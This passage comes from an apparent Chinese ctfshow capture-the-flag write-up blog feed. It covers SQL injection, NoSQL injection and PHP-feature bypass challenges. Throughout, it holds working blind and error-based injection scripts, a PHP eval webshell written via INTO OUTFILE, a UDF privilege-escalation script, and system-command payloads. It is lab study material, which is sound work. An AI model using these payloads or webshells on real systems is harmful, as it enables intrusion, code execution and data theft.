class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-comment">### web240</span><br><br>- ```python<br>  import requests<br>  <br>  kk = <span class="hljs-string">&quot;ab&quot;</span><br>  url1 = <span class="hljs-string">&quot;http://d527c27f-64cd-48fa-b3e8-807df67f2f20.challenge.ctf.show/api/insert.php&quot;</span><br>  url2 = <span class="hljs-string">&quot;http://d527c27f-64cd-48fa-b3e8-807df67f2f20.challenge.ctf.show/api/?page=1&amp;limit=100&quot;</span><br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> kk:<br>      <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> kk:<br>          <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> kk:<br>              <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> kk:<br>                  <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> kk:<br>                      flag = <span class="hljs-string">&quot;flag&quot;</span> + i + j + m + n + c<br>                      <span class="hljs-built_in">print</span>(flag)<br>                      data = &#123;<br>                          <span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&quot;luelueking&#x27;,(select(group_concat(flag))from(&#123;&#125;)));#&quot;</span>.format(flag),<br>                          <span class="hljs-string">&#x27;password&#x27;</span>: 1<br>                      &#125;<br>                      res = requests.post(<span class="hljs-attribute">url</span>=url1, <span class="hljs-attribute">data</span>=data).text<br>  <br>                      r = requests.<span class="hljs-built_in">get</span>(<span class="hljs-attribute">url</span>=url2).text<br>                      <span class="hljs-built_in">print</span>(r)<br>                      <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;ctfshow&#123;&quot;</span> <span class="hljs-keyword">in</span> r:<br>                          <span class="hljs-built_in">print</span>(res)<br>                          exit()<br>  <br></code></pre></td></tr></table></figure></li></ul><h3 id="web241"><a href="#web241" class="headerlink" title="web241"></a>web241</h3><ul><li><pre><code class="python">import requestsimport timeurl = &#39;http://060c1957-6988-495b-82a7-bd24f6611427.challenge.ctf.show:8080/api/delete.php&#39;flag = &#39;&#39;i = 4while 1:    i += 1    head = 32    tail = 127    while head &lt; tail:        mid = (head + tail) &gt;&gt; 1        # 查库名        # payload = &#39;database()&#39;        # 查表名        # payload = &#39;(select group_concat(table_name) from information_schema.tables where table_schema=database())&#39;        # 查列名        # payload = &quot;(select group_concat(column_name) from information_schema.columns where table_name=&#39;flag&#39;)&quot;        # 查flag        payload = &#39;(select flag from flag)&#39;        data = &#123;            &#39;id&#39;:f&quot;if(ascii(substr(&#123;payload&#125;,&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(0.1),0)#&quot;        &#125;        try:            r = requests.post(url=url,data=data,timeout=2.1)            tail = mid        except Exception as e:            head = mid + 1        time.sleep(1)    if head != 32:        flag += chr(head)    else:        break    time.sleep(1)    print(flag)<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs oxygene"><br>### web242<br><br>- 利用info outfile的扩展参数来做题<br><br>- ```sql<br>  <span class="hljs-keyword">SELECT</span> ... <span class="hljs-keyword">INTO</span> OUTFILE <span class="hljs-string">&#x27;file_name&#x27;</span><br>          [CHARACTER <span class="hljs-keyword">SET</span> charset_name]<br>          [export_options]<br>  <br>  export_options:<br>      [<span class="hljs-comment">&#123;FIELDS | COLUMNS&#125;</span><br>          [TERMINATED <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;string&#x27;</span>]<span class="hljs-comment">//分隔符</span><br>          [[OPTIONALLY] ENCLOSED <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;char&#x27;</span>]<br>          [ESCAPED <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;char&#x27;</span>]<br>      ]<br>      [LINES<br>          [STARTING <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;string&#x27;</span>]<br>          [TERMINATED <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;string&#x27;</span>]<br>      ]<br></code></pre></td></tr></table></figure></code></pre></li><li><pre><code class="sql">“OPTION”参数为可选参数选项，其可能的取值有：`FIELDS TERMINATED BY &#39;字符串&#39;`：设置字符串为字段之间的分隔符，可以为单个或多个字符。默认值是“\t”。`FIELDS ENCLOSED BY &#39;字符&#39;`：设置字符来括住字段的值，只能为单个字符。默认情况下不使用任何符号。`FIELDS OPTIONALLY ENCLOSED BY &#39;字符&#39;`：设置字符来括住CHAR、VARCHAR和TEXT等字符型字段。默认情况下不使用任何符号。`FIELDS ESCAPED BY &#39;字符&#39;`：设置转义字符，只能为单个字符。默认值为“\”。`LINES STARTING BY &#39;字符串&#39;`：设置每行数据开头的字符，可以为单个或多个字符。默认情况下不使用任何字符。`LINES TERMINATED BY &#39;字符串&#39;`：设置每行数据结尾的字符，可以为单个或多个字符。默认值是“\n”。<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><br><span class="hljs-bullet">- </span><span class="hljs-strong">**可以写马的参数有：**</span><br><br></code></pre></td></tr></table></figure>FIELDS TERMINATED BY`、 `LINES STARTING BY`、 `LINES TERMINATED BY<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><br>在url<span class="hljs-regexp">/api/</span><span class="hljs-keyword">dump</span>.php下写马<br><br>马在url<span class="hljs-regexp">/dump/</span><span class="hljs-number">1</span>.php<br><br></code></pre></td></tr></table></figure>POST: filename=1.php&#39; LINES STARTING BY &quot;&lt;?php eval($_POST[1]);?&gt;&quot;;#<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-section">### web243</span><br><br><span class="hljs-bullet">-</span> 过滤了php<br><br><span class="hljs-bullet">-</span> 在上一题目的payload中是需要php字段的，这里给取消掉了，也不知道phtml好不好用，但是本地重要考点在于.user.ini:auto<span class="hljs-emphasis">_append_</span>file=1.png或者auto<span class="hljs-emphasis">_prepend_</span>file=1.png<br><br><span class="hljs-bullet">-</span> 再熟悉一遍上一题的参数：<br><br></code></pre></td></tr></table></figure>FIELDS TERMINATED BY：设置字符串为字段之间的分隔符，可以为单个或多个字符。默认值是“\t”。LINES STARTING BY &#39;字符串&#39;：设置每行数据开头的字符，可以为单个或多个字符。默认情况下不使用任何字符。LINES TERMINATED BY &#39;字符串&#39;：设置每行数据结尾的字符，可以为单个或多个字符。默认值是“\n”。<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs"><br>payload：<br><br>先上ini：<br><br></code></pre></td></tr></table></figure>filename=.user.ini&#39; LINES STARTING BY &#39;;&#39; TERMINATED BY 0x0a6175746f5f70726570656e645f66696c653d312e706e670a;#注意16进制是为了0a(换行)发挥作用，而starting by “;”，是想让每行数据的开头字符都是分号，是为了让前面的那个select * from ctfshow_user查出来的东西与后面的做个了断<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss"><br>再上png🐴：(<span class="hljs-number">16</span>进制绕过)<br><br></code></pre></td></tr></table></figure>filename=1.png&#39; LINES TERMINATED BY 0x3c3f706870206576616c28245f504f53545b315d293b3f3e;#<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>  <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span><br>  连接时候注意是/dump/index.php<br><br><span class="hljs-comment">### web244</span><br><br>- 报错注入<br><br>- 二种形式<br><br>- ```<br>  <span class="hljs-title function_ invoke__">extractvalue</span>(目标xml文档，xml路径):对XML文档进行查询的函数<br>  <br>  <span class="hljs-title function_ invoke__">updatexml</span>(目标xml文档，xml路径，更新的内容):更新xml文档的函数<br>  <br>  其都是针对xml路径进行的注入<br>  <br></code></pre></td></tr></table></figure></code></pre></li><li><p>&#96;&#96;&#96;<br>updatexml:<br>?id&#x3D;1’ or updatexml(1,concat(0x7e,database(),0x7e),1)+–+</p><p>?id&#x3D;1’ or updatexml(1,concat(0x7e,substr((select group_concat(flag) from ctfshow_flag),1,32),0x7e),1)+–+</p><p>?id&#x3D;1’ or updatexml(1,concat(0x7e,(select left(flag,32) from ctfshow_flag),0x7e),1)+–+</p><p>?id&#x3D;1’ or updatexml(1,concat(0x7e,(select right(flag,32) from ctfshow_flag),0x7e),1)+–+</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-comment">### web245</span><br><br>- 过滤了updatexml<br><br>- ```<br>  extractvalue:<br>  ?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">or</span> extractvalue(1,concat(0x7e,(select group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=database()),0x7e))+--+<br>  <br>  ?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">or</span> extractvalue(1,concat(0x7e,substr((select group_concat(flag1) <span class="hljs-keyword">from</span> ctfshow_flagsa),20,30),0x7e))+--+<br></code></pre></td></tr></table></figure></li></ul><h3 id="web246"><a href="#web246" class="headerlink" title="web246"></a>web246</h3><ul><li><p>update也被过滤了</p></li><li><p><strong>floor报错注入</strong>:主要利用主键的重复来实现报错</p></li><li><p>&#96;&#96;&#96;<br>?id&#x3D;1’ union select 1,count(*),concat(0x7e,database(),0x7e,floor(rand(0)*2))b from information_schema.tables group by b– -</p><p>?id&#x3D;1’ union select 1,count(*),concat((select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1), 0x7e,floor(rand(0)*2))b from information_schema.tables group by b – -</p><p>?id&#x3D;1’ union select 1,count(*),concat(0x7e,(select flag2 from ctfshow_flags),0x7e,floor(rand(0)*2))b from information_schema.tables group by b– -</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs q"><br>### web247<br><br>- **`floor()：向下取整`<br>  `ceil()：向上取整`<br>  `round()：四舍五入`**<br><br>  **<span class="hljs-built_in">floor</span>替换成其他取整函数即可**<br><br>- ```<br>  ?id=<span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">count</span>(*),concat((<span class="hljs-keyword">select</span> `flag?` <span class="hljs-keyword">from</span> ctfshow_flagsa ), <span class="hljs-number">0x7e</span>,round(<span class="hljs-built_in">rand</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))b <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">group</span> <span class="hljs-keyword">by</span> b -- -<br></code></pre></td></tr></table></figure></li></ul><h3 id="web248"><a href="#web248" class="headerlink" title="web248"></a>web248</h3><ul><li><p><strong>udf：用户自定义的函数</strong></p></li><li><p>&#96;&#96;&#96;<br>&#x2F;api&#x2F;?id&#x3D;1’; select @@plugin_dir; – -<br>查出Mysql插件路径：&#x2F;usr&#x2F;lib&#x2F;mariadb&#x2F;plugin&#x2F;</p><p>&#x2F;api&#x2F;?id&#x3D;’;CREATE FUNCTION sys_eval RETURNS STRING SONAME ‘udf.so’;–+<br>引入udf.so文件从而创建函数sys_eval</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><br>- <span class="hljs-built_in">exp</span>提权<br><br>- ```<br>  import requests<br>  <br>  base_url=<span class="hljs-string">&quot;http://3f801e10-5c58-42bf-a5cf-8a588d3bfe9c.challenge.ctf.show:8080/api/&quot;</span><br>  payload = []<br>  <span class="hljs-keyword">text</span> = [<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-string">&quot;e&quot;</span>]<br>  udf = <span class="hljs-string">&quot;&quot;</span><br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">21510</span>, <span class="hljs-number">5000</span>):<br>      <span class="hljs-function"><span class="hljs-keyword">end</span> = <span class="hljs-title">i</span> + <span class="hljs-title">5000</span></span><br>      payload.append(udf[i:<span class="hljs-keyword">end</span>])<br>  <br>  p = dict(zip(<span class="hljs-keyword">text</span>, payload))<br>  <br>  <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> <span class="hljs-keyword">text</span>:<br>      url = base_url+<span class="hljs-string">&quot;?id=&#x27;;select unhex(&#x27;&#123;&#125;&#x27;) into dumpfile &#x27;/usr/lib/mariadb/plugin/&#123;&#125;.txt&#x27;--+&amp;page=1&amp;limit=10&quot;</span>.<span class="hljs-built_in">format</span>(p[t], t) <span class="hljs-comment">#UDF提权一般配合dumpfile 而不是outfile</span><br>      r = requests.<span class="hljs-built_in">get</span>(url)<br>      print(r.status_code)<br>  <br>  next_url = base_url+<span class="hljs-string">&quot;?id=&#x27;;select concat(load_file(&#x27;/usr/lib/mariadb/plugin/a.txt&#x27;),load_file(&#x27;/usr/lib/mariadb/plugin/b.txt&#x27;),load_file(&#x27;/usr/lib/mariadb/plugin/c.txt&#x27;),load_file(&#x27;/usr/lib/mariadb/plugin/d.txt&#x27;),load_file(&#x27;/usr/lib/mariadb/plugin/e.txt&#x27;)) into dumpfile &#x27;/usr/lib/mariadb/plugin/udf.so&#x27;-- +&amp;page=1&amp;limit=10&quot;</span> <span class="hljs-comment">#将各个txt文件合并到udf.so</span><br>  rn = requests.<span class="hljs-built_in">get</span>(next_url)<br>  <br>  uaf_url=base_url+<span class="hljs-string">&quot;?id=&#x27;;CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;udf.so&#x27;;--+&quot;</span><span class="hljs-comment">#创建udf函数</span><br>  r=requests.<span class="hljs-built_in">get</span>(uaf_url)<br>  nn_url = base_url+<span class="hljs-string">&quot;?id=&#x27;;select sys_eval(&#x27;cat /flag.*&#x27;);-- +&amp;page=1&amp;limit=10&quot;</span><span class="hljs-comment">#执行命令并查看</span><br>  rnn = requests.<span class="hljs-built_in">get</span>(nn_url)<br>  print(rnn.<span class="hljs-keyword">text</span>)<br></code></pre></td></tr></table></figure></li></ul><h3 id="web249"><a href="#web249" class="headerlink" title="web249"></a>web249</h3><ul><li><p>nosql注入</p></li><li><p>&#96;&#96;&#96;<br>&#x2F;api&#x2F;?id[]&#x3D;flag</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gams"><br>### web250<br><br>- ```<br>  username[<span class="hljs-symbol">$</span><span class="hljs-keyword">ne</span>]=<span class="hljs-number">1</span>&amp;password[<span class="hljs-symbol">$</span><span class="hljs-keyword">ne</span>]=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="web251"><a href="#web251" class="headerlink" title="web251"></a>web251</h3><ul><li>&#96;&#96;&#96;<br>username[$ne]&#x3D;admin&amp;password[$ne]&#x3D;1<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><br><span class="hljs-comment">### Web252</span><br><br>- ```<br>  username[<span class="hljs-variable">$regex</span>]=^[^a].*<span class="hljs-variable">$&amp;</span>password[<span class="hljs-variable">$ne</span>]=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="web253"><a href="#web253" class="headerlink" title="web253"></a>web253</h3><ul><li><p>无回显</p></li><li><p>利用regex正则盲注</p></li><li><pre><code class="python">import requestsurl=&quot;http://73acfdad-dba7-48b6-a770-1562af8ccf38.challenge.ctf.show/api/index.php&quot;flag=&quot;ctfshow&#123;&quot;s=&#39;0123456789abcdef-&#125;&#39;for i in range(9,46):    print(i)    for j in s:        data=&#123;            &#39;username[$ne]&#39;:&#39;1&#39;,            &#39;password[$regex]&#39;:f&#39;^&#123;flag+j&#125;&#39;        &#125;        r=requests.post(url=url,data=data)        if r&quot;\u767b\u9646\u6210\u529f&quot; in r.text:            flag+=j            print(flag)            if j==&quot;&#125;&quot;:                exit()            break</code></pre></li></ul>]]></content>
    
    
    <categories>
      
      <category>ctfshow</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CTF_show_Web入门_php特性</title>
    <link href="/2022/07/16/CTF_show_Web%E5%85%A5%E9%97%A8_php%E7%89%B9%E6%80%A7/"/>
    <url>/2022/07/16/CTF_show_Web%E5%85%A5%E9%97%A8_php%E7%89%B9%E6%80%A7/</url>
    
    <content type="html"><![CDATA[<h1 id="CTFshow-WriteUps"><a href="#CTFshow-WriteUps" class="headerlink" title="CTFshow WriteUps"></a>CTFshow WriteUps</h1><hr><h2 id="WEB入门"><a href="#WEB入门" class="headerlink" title="WEB入门"></a>WEB入门</h2><hr><h2 id="php特性"><a href="#php特性" class="headerlink" title="php特性"></a>php特性</h2><h3 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h3><ul><li><p>intval函数：如果他的值为一个数组，只要数组里有值，不论数量，返回1，空数组返回0</p></li><li><p>preg_match()函数可以用数组绕过</p></li><li><p>&#96;&#96;&#96;<br>&#x2F;?num[]&#x3D;1</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>### web90<br><br>- 进制绕过<br><br>- ```<br>  /?num=<span class="hljs-number">010574</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h3><ul><li><p>m的意思是多行匹配</p></li><li><p>&#96;&#96;&#96;<br>&#x2F;?cmd&#x3D;%0aphp</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>### web92<br><br>- ```<br>  /?num=<span class="hljs-number">0x117c</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h3><ul><li>&#96;&#96;&#96;<br>&#x2F;?num&#x3D;010574<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>### web94<br><br>- ```<br>  /?num=<span class="hljs-number">4476.0</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h3><ul><li>&#96;&#96;&#96;<br>&#x2F;?num&#x3D;+010574<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><br><span class="hljs-comment">### web96</span><br><br>- ```<br>  <span class="hljs-regexp">/?u=./</span>flag.php<br></code></pre></td></tr></table></figure></li></ul><h3 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h3><ul><li>&#96;&#96;&#96;<br>a[]&#x3D;1&amp;b[]&#x3D;2<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>### web98<br><br>- ```<br>  GET值随便传<br>  POST：HTTP_FlAG=flag<br></code></pre></td></tr></table></figure></li></ul><h3 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h3><ul><li><p>array_push()向数组尾部插入一个或多个元素</p></li><li><p>file_put_contents() 写入函数</p></li><li><pre><code class="hljs">GET:n=1.phpPOST:content=&lt;?=`tac f*`;多试几次<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><br><span class="hljs-comment">### web100</span><br><br>- =的优先级高于<span class="hljs-keyword">and</span><br>- 所以只要<span class="hljs-built_in">v1</span>为true就行<br><br>- ```<br>  /?<span class="hljs-built_in">v1</span><span class="hljs-number">=1</span>&amp;<span class="hljs-built_in">v2</span><span class="hljs-symbol">=var_dump</span>($ctfshow)&amp;<span class="hljs-built_in">v3</span>=<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure></code></pre></li><li><p>flag中把0x2d换成-</p></li></ul><h3 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h3><ul><li><p>反射</p></li><li><pre><code class="hljs">/?v1=1&amp;v2=echo new Reflectionclass&amp;v3=;<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs dts"><br>- 最后一位爆破<br><br><span class="hljs-meta">### web102～103</span><br><br>- ```<br><span class="hljs-symbol">  GET:</span>/?v2=<span class="hljs-number">115044383959474e6864434171594473</span><span class="hljs-variable">&amp;v3</span>=php:<span class="hljs-comment">//filter/write=convert.base64-decode/resource=2.php</span><br><span class="hljs-symbol">  POST:</span>v1=hex2bin<br></code></pre></td></tr></table></figure></code></pre></li><li><p>然后访问2.php查看源码</p></li><li><p>hex2bin就是把十六进制值的字符串转换为ASCII字符</p></li></ul><h3 id="web104"><a href="#web104" class="headerlink" title="web104"></a>web104</h3><ul><li>&#96;&#96;&#96;<br>GET:v2[]&#x3D;1<br>POST:v1[]&#x3D;1<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-comment">### web105</span><br><br>- ```<br>  GET:<span class="hljs-attribute">suces</span>=flag<br>  POST:<span class="hljs-attribute">error</span>=suces<br></code></pre></td></tr></table></figure></li></ul><h3 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h3><ul><li><pre><code class="hljs">GET:v2[]=1POST:v1[]=2<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-comment">### web107</span><br><br>- ```<br>  GET:<span class="hljs-attribute">v3</span>=240610708<br>  POST:<span class="hljs-attribute">v1</span>=flag=0<br></code></pre></td></tr></table></figure></code></pre></li><li><p>解释一下：240610708经过md5加密后是0e462…..</p></li><li><p>因为是弱类比较所以0&#x3D;&#x3D;0e</p></li></ul><h3 id="web108"><a href="#web108" class="headerlink" title="web108"></a>web108</h3><ul><li><p>ereg函数的功能是用指定的模式搜索一个字符长中指定的字符串，如果匹配成功就返回true。大小敏感。<strong>但是存在NULL漏洞</strong>，导致了正则过滤被绕过，所以可以使用%00截断正则匹配</p></li><li><p>strrev函数就是返还反转后的字符串</p></li><li><p>&#96;&#96;&#96;<br>&#x2F;?c&#x3D;a%00778</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>### web109<br><br>- Exception是所以异常的基类<br><br>- ```<br>  /?v1=exception&amp;v2=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>)<br>  /?v1=exception&amp;v2=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;tac f*&#x27;</span>)<br></code></pre></td></tr></table></figure></li></ul><h3 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h3><ul><li><p>FilesystemIterator 遍历文件类</p></li><li><p>getcwd 取得当前工作目录</p></li><li><p>组合在一起默认只显示第一个文件</p></li><li><p>&#96;&#96;&#96;<br>&#x2F;?v1&#x3D;FilesystemIterator&amp;v2&#x3D;getcwd</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>- 访问fl36dga.txt<br><br>### web111<br><br>- ```<br>  v1=ctfshow&amp;v2=GLOBALS<br></code></pre></td></tr></table></figure></li></ul><h3 id="web112"><a href="#web112" class="headerlink" title="web112"></a>web112</h3><ul><li>&#96;&#96;&#96;<br>&#x2F;?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;flag.php<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>### web113<br><br>- ```<br>  /?file=compress.zlib:<span class="hljs-comment">//flag.php</span><br>  读取压缩流<br></code></pre></td></tr></table></figure></li></ul><h3 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h3><ul><li><pre><code class="hljs">/?file=php://filter/resource=flag.php<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment">### web115</span><br><br>- 需要满足条件：<br>  - 通过is_numeric的检测<br>  - 不等于<span class="hljs-number">36</span><br>  - 去空后依旧不等于<span class="hljs-number">36</span><br>  - 经过过滤方法后等于<span class="hljs-number">36</span><br><br>- fluzz脚本<br><br>- ```php<br>  <span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">129</span>;<span class="hljs-variable">$i</span>++)&#123;<br>  <span 